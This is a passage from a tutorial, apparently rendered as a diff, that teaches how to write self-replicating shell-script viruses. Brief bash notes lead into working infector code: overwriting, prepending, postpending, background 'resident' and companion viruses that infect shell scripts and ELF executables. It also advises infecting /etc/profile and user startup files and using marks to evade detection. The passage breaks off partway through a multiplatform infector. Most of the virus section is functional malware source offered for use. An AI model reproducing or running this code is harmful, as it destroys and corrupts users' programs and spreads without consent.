+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #000000; font-weight: bold;">!</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$FILE</span> <span style="color: black;">&#93;</span><br/>
+<span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$FILE</span><br/>
+<span style="color: #000000; font-weight: bold;">fi</span><br/>
+&nbsp;</div>
+<p>or</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$FILE</span> <span style="color: black;">&#93;</span><br/>
+<span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; :<br/>
+<span style="color: #000000; font-weight: bold;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$FILE</span><br/>
+<span style="color: #000000; font-weight: bold;">fi</span><br/>
+&nbsp;</div>
+<p>where ":" corresponds to the null instruction in shell scripting, equal to the NOP used in assembler language.</p>
+<h5>Command blocks</h5>
+<p>Another improvement in Bash is the posibility of handling a list of commands as a block, and redirect its output or its input as a group, for example:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-15</span> <span style="color: #007800;">$0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> hello<span style="color: #000000; font-weight: bold;">!</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cat</span> .<span style="color: #000000; font-weight: bold;">/</span>tmp<br/>
+<span style="color: black;">&#125;</span> <span style="color: #000000; font-weight: bold;">&gt;</span> tmp2<br/>
+&nbsp;</div>
+<p>would redirect the result of the three commands in the block to the "tmp2" file. This can help writing clean and tiny scripts.</p>
+<h5>The "printf" command</h5>
+<p>As well as being a C function, "printf" is a UNIX command that allows a formatted text output. In the examples of this tutorial I have used it to translate hex codes into normal ASCII with "printf \x126", for example, but "printf" is a much more powerful command, as you can see in the info pages ("info printf").</p>
+<h5>The "file" command</h5>
+<p>This command tells us about the file type we are handling. It usually tries to guess it by reading file headers, but sometimes can fail.</p>
+<p>Look at the manual pages for more info ;-)</p>
+<h5>String handling in bash</h5>
+<p>Bash has a powerful group of built-ins for string handling. We can get their length, extract strings from other strings, mix strings, etc.</p>
+<p>This kind of expresions are not standard for all the UNIX shells, so we will be gaining speed but losing compatibility using them. If we want to do the same but in a more standard way is better to use the "expr" command.</p>
+<p>For an extensive use of this type of built-ins I recommend reading "Advanced Bash-Scripting Guide: A complete guide to shell scripting, using bash", written by Mendel Cooper. In this tutorial I will only use "${#STRING}" to get the length of "STRING", which could be done using "expr length $STRING" in a more standard way but calling an external command.</p>
+<h5>The "basename" command</h5>
+<p>This command allows us to extract the name of the program from a call to the program with a path to the executable file. It's very useful when we need to call the same program from a different place.</p>
+<p>For example, if we want to execute a script with this command:</p>
+<pre class="source">$>/home/zert/script.sh</pre>
+<p>"basename $0" inside the code of "script.sh" will return "script.sh", substracting the path from the call command.</p>
+<h5>The "alias" clause</h5>
+<p>When we use very oftenly a command, one way to perform the same action much easier and faster is by using aliases. The main idea is to translate one complex comand to a little and well-known word, for example:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #7a0874; font-weight: bold;">alias</span> <span style="color: #007800;">findexec</span>=<span style="color: #ff0000;">&quot;find / -perm +x 2&gt;/dev/null&quot;</span></div>
+<p>Each time we call "findexec" we will really call "find / -perm +x 2>/dev/null", which is much larger and complex to write.</p>
+<h2><a name="c3"></a>3. Shell script virus</h2>
+<h3><a name="c31"></a>3.1. Infection techniques</h3>
+<p>We will see the way our shell script viruses are going to infect, pointing up advantages and disadvantages of using every technique. The syntax particularities and the commands we will be using are explained in the chapter 2.1.1.</p>
+<h4><a name="c311"></a>3.1.1.- Overwriting</h4>
+<p>It is, without a doubt, the easiest and worst technique, where our virus destroys the host program by overwriting it, making it useless. In any kind of virus this method should be avoided, but anyways, here are some examples of viruses using overwriting technique.</p>
+<p><strong>over1.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cp</span> <span style="color: #007800;">$0</span> <span style="color: #007800;">$F</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp;</div>
+<p>This has an easy explanation. For every file in the directory copies itself ($0) to the file.</p>
+<p>If we want to copy it only in other shell scripts we could do a check with "head" or "grep", like I will explain later.</p>
+<p><strong>over2.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> $<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">grep</span> <span style="color: #ff0000;">'#!/bin/sh'</span> <span style="color: #000000; font-weight: bold;">*</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">cut</span> <span style="color: #660033;">-d</span><span style="color: #ff0000;">&quot;:&quot;</span> -f1<span style="color: black;">&#41;</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-5</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp;</div>
+<p>What we do in this example is copy first 5 lines of this script (head -5 $0) to every file containing the string '#!/bin/sh'.</p>
+<p>With $() we execute what is inside the brackets and we substitute the result, thus LIST=$(echo dog cat) would be the same as defining LIST="dog cat".</p>
+<p>Notice that we have redirected the standard error output (stderr) to /dev/null (2>/dev/null) to avoid error messages that grep can produce.</p>
+<p>With cut we separate the information gotten from grep, using only the string before the ":".</p>
+<p>Another important thing is that with this technique we will not have to see if the host file was already infected or not, because it will be overwritten, but this fact has to be taken in account in the other infecting methods.</p>
+<h4><a name="c312"></a>3.1.2. Prepending</h4>
+<p>This technique consists on allocating the virus code in the beginning of the host file. With this we can assure that our code is the first thing to be executed, but has the problem that our code is excesively detectable.</p>
+<p>Let's see an example of this kind of virus:</p>
+<p><strong>pre1.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$(head -c9 $F 2&gt;/dev/null)</span>&quot;</span> = <span style="color: #ff0000;">&quot;#!/bin/sh&quot;</span> <span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-11</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> tmp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$F</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> tmp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">mv</span> tmp <span style="color: #007800;">$F</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp;</div>
+<p>We notice that there is a blank line in the beginning of the script. This will be our (silent) infection mark, because the scripts that start with a blank line will not satisfy the "if" condition.</p>
+<p>Once a host is found we copy the virus code into a temporal file and then the hosts code. To finish, we move the temporay file into the original host.</p>
+<p>As we can see there is a great disadvantage in using a temporary file, which makes the process slower because it has to access to the disk, it makes us detectable in the system and can cause infraction while sharing the file (imagine that a user from two different consoles executes the virus, it would be executed twice, so both viruses would try to use "tmp", but only one could reach itr objective).</p>
+<p>This can be avoided using a little trick. In a shell script, all the contents of a file can be stored in a variable, so if we dump the host into a variable in memory instead of another file will would reach our objective:</p>
+<p><strong>pre2.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$(head -c9 $F 2&gt;/dev/null)</span>&quot;</span> = <span style="color: #ff0000;">&quot;#!/bin/sh&quot;</span> <span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">HOST</span>=$<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$F</span><span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">tr</span> <span style="color: #ff0000;">'\n'</span> Ç<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-11</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">$HOST</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">tr</span> Ç <span style="color: #ff0000;">'\n'</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp;</div>
+<p>As it's shown, the variable named HOST contains the host's code so we can avoid using a temporary file. But to do this we have had to use a little trick: as when dumping the host's code into a variable the line jumps are lost, we translate them into another unused character which could be 'Ç', to keep them located. So when dumping back from the file to the file again we will translate those characters into line jumps, getting the original file :-)</p>
+<p>Another way of doing a prepending virus is trying not to include our virus' code itself in the beginning of the script. This could take us to think about a "source" or "." clause, which allow to include code from an external file in a single line. But this would separate our virus from the host because the virus code would not be itself in the host's code but in the same directory, and then an infection would not happen in case they are separated.</p>
+<p>To avoid this we could use calls to functions inside the shell script code. But functions should be specfied in the beginning of the file, so it would not work. Let's see it with an example:</p>
+<p><strong>pre3.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;"># ATCHTUNG! This shell script DOESN`T WORK!!!!!</span><br/>
+<span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+start<br/>
+<span style="color: #666666; font-style: italic;"># host code ...</span><br/>
+start <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$(head -c9 $F 2&gt;/dev/null)</span>&quot;</span> = <span style="color: #ff0000;">&quot;#!/bin/sh&quot;</span> <span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">HOST</span>=$<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$F</span><span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">tr</span> <span style="color: #ff0000;">'\n'</span> Ç<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-3</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">$HOST</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">tr</span> Ç <span style="color: #ff0000;">'\n'</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-12</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$F</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>This code fails when trying to execute "start" because it is not a valid command and has not been defined yet ;-(</p>
+<h4><a name="c313"></a>3.1.3. Postpending</h4>
+<p>By using this technique we put our code at the end of the host file so it is more difficult for it to be detected, but in the other hand, we can not assure its execution (if the host script finishes without arriving at the end of its code because of an abnormal exit or an error, for example).</p>
+<p>I personally consider this method the best of the explained ones because we avoid being so explicit by putting the code at the end, and usually scripts execute all their code until the end.</p>
+<p>At the programming level is similar to the rest of explained examples:</p>
+<p><strong>post1.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$(head -c9 $F 2&gt;/dev/null)</span>&quot;</span> = <span style="color: #ff0000;">&quot;#!/bin/sh&quot;</span> <span style="color: #660033;">-a</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$(tail -1 $F 2&gt;/dev/null)</span>&quot;</span> <span style="color: #000000; font-weight: bold;">!</span>= <span style="color: #ff0000;">&quot;# :-P&quot;</span> <span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-8</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+<span style="color: #666666; font-style: italic;"># :-P</span><br/>
+&nbsp;</div>
+<p>The most important thing in this example is copying our code at the end of the host file with "tail -8 $0 >> $F 2>/dev/null". Another important point is that we need another infection mark, we can not leave a blank line in the beginning of the file because we will copy our code at the end. That is why we leave a comment (# :-P), so we can detect it in the second part of the "if" ("$(tail -1 $F 2>/dev/null)" != "# :-P").</p>
+<h4><a name="c314"></a>3.1.4. Residence</h4>
+<p>When I talk about residence I do not refer to a real residence where the virus is saved into the memory waiting for a shell script to execute and then infect it, and we avoid to be shown in the process list with a LKM (Loadable Kernel Module). In our case of residence is just that our shell script virus stays in background not to delay too much its host's execution.</p>
+<p>To do this we will need a temporary file where we will dump our code and then we will invoke it for background execution. Let's see an example:</p>
+<p><strong>resident1.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-13</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> tmp <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+<span style="color: #c20cb9; font-weight: bold;">chmod</span> +x tmp <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+.<span style="color: #000000; font-weight: bold;">/</span>tmp <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&amp;</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+<br/>
+<span style="color: #7a0874; font-weight: bold;">exit</span> <span style="color: #000000;">0</span><br/>
+<br/>
+<span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$(head -c9 $F 2&gt;/dev/null)</span>&quot;</span> = <span style="color: #ff0000;">&quot;#!/bin/sh&quot;</span> <span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">HOST</span>=$<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$F</span><span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">tr</span> <span style="color: #ff0000;">'\n'</span> \xc7<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-5</span> <span style="color: #007800;">$1</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">$HOST</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">tr</span> \xc7 <span style="color: #ff0000;">'\n'</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> <span style="color: #660033;">-v</span> <span style="color: #ff0000;">'#!/bin/sh'</span><span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-14</span> <span style="color: #007800;">$1</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">rm</span> tmp <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp;</div>
+<p>Let's explain this with a little bit of detail... what we do in the beginning is to copy the virus code into a temporary file, give it execution privileges (chmod +x) and execute it in background (&amp;) sending the current script name as a parameter ($0). This parameter will be used later on.</p>
+<p>The host's code would go just after this, and to finish, it exits without executing last part (it is already being executed, because we called tmp&amp;).</p>
+<p>In the temporary file we have created the last 13 lines of the virus, this is, the typical things:</p>
+<ul>
+<li>a loop to search shell scripts,</li>
+<li>we store the host into a variable,</li>
+<li>we copy the first 5 lines of the file containing the complete virus (now is $1, the parameter with which we call tmp, remember?)</li>
+<li>we dump the content of the variable named HOST to the file, deleting the first line '#!/bin/sh' if it exists (with grep -v we show everything, except the line containing the specified string),</li>
+<li>and finally we delete the temporary file.</li>
+</ul>
+<p>It is not really necessary to do all this stuff for such a small code, but this technique can be useful when used with viruses which do complex operations, as we will see in the polymorphic viruses.</p>
+<p>If our aim is a resident virus expecting the execution of a possible objective, we have to try the infection of the startup scripts (".bash_rc", "bash_profile"...) to be in execution each time user's shell is launched. Optimal example of this idea would be to infect "/etc/profile", because it's accessed each time an user's logon is done :-)</p>
+<h4><a name="c315"></a>3.1.5. Companion</h4>
+<p>A companion virus, as means its name, "follows" the host file, with no modification of it. Usually, the main process of this type of infection is to move the host to another file (commonly hidden) and to write the virus code in a file with the original host's name.</p>
+<p>This method has a weak side: if somebody moves one of the "companion" files, the infection will be broken and the virus code wouldn't find it's original host file.</p>
+<p>This example shows a companion virus to explain practically the idea:</p>
+<p><strong>companion.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-f</span> <span style="color: #007800;">$F</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-x</span> <span style="color: #007800;">$F</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$(head -c4 $F 2&gt;/dev/null )</span>&quot;</span> == <span style="color: #ff0000;">&quot;ELF&quot;</span> <span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cp</span> <span style="color: #007800;">$F</span> .<span style="color: #007800;">$F</span> <span style="color: #660033;">-a</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-10</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$F</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+.<span style="color: #000000; font-weight: bold;">/</span>.$<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">basename</span> <span style="color: #007800;">$0</span><span style="color: black;">&#41;</span><br/>
+&nbsp;</div>
+<p>Assuming all shown until this point, this code doesn't need further explanations. The only fact that may be remarcked is that we use "cp -a" instead of "mv" to move the host file. This is done to mantain all file attributes with no modification. Another important thing is to perform accurately the call to the original host file. We must use "basename $0", because if we use simply ".$0" or "./.$0" and we call the host with a command like this:</p>
+<pre class="source">$>./host</pre>
+<p>we are trying to execute the original host file like this: "../host" or "./../host" respectively, which are obviosly wrong.</p>
+<p>This code infects ELF executables from a shell script according to the idea show by SnakeByte in a previous article. In next chapter we will be able to code an evolutionated version of this idea with a multipartite or multiplatform virus, which will infect many types of executable files.</p>
+<h4><a name="c316"></a>3.1.6. Multiplatform</h4>
+<p>Multiplatform viruses are known for having the possibility of infecting different platforms. The most spectacular cases are when viruses infect different microprocessors (such as Motorola or Intel), performing rare tricks in assembler.</p>
+<p>Shell script viruses are, in essence, multiplatform, because they can expand in multiple platforms as far as a shell exists (almost all UNIX flavors have a Bash version). But I'd like to write about other kind of viruses in this document. We will develop a shell script infector capable of infecting any kind of executable file that has a simple call from a shell:</p>
+<pre class="source">$>/directory/executable -parameters</pre>
+<p>This is, without the call to an interpreter or similar like in a Perl executable.</p>
+<p>Let's analyze our generic executable infector's code. The idea is to copy ourselves at the beginning of the executable, transforming it into a shell script, whatever the type of file it is. After, we launch an infector process in background so the "host"'s execution is not delayed, and then we dump the "host" code into a temporary file and execute it.</p>
+<p><strong>elfo.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#;P</span><br/>
+<span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'for F in *'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'do'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' if [ -f $F ] &amp;&amp; [ -x $F ] &amp;&amp; [ &quot;$(head -c3 $F)&quot; != &quot;#;P&quot; ]'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' then'</span><br/>
